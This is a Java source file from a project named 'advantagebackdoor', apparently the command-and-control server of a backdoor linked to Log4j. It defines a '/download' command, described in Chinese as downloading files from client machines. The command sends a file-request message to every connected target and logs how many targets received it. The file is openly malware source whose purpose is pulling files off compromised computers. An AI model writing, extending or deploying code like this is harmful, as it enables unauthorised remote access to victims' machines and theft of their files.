package me.faintcloudy.advantagebackdoor.server.command;

import me.faintcloudy.advantagebackdoor.server.Log4jServer;
import me.faintcloudy.advantagebackdoor.api.connection.UserConnection;
import me.faintcloudy.advantagebackdoor.api.message.play.server.ClientFileRequestMessage;

public class DownloadCommand extends ServerCommand {
    public DownloadCommand() {
        super("/download", "从客户机上下载文件");
    }

    @Override
    public void execute(String[] args) {
        if (args.length < 2)
        {
            Log4jServer.getInstance().getLogger().info("正确用法: /download <filename>");
            return;
        }

        String file = args[1];
        ClientFileRequestMessage message = new ClientFileRequestMessage(file);
        for (UserConnection target : Log4jServer.getInstance().getTargets()) {
            target.sendMessage(message);
        }

        Log4jServer.getInstance().getLogger().info("已向 " + Log4jServer.getInstance().getUsers().size() + " 个目标发送了下载文件请求");
    }
}
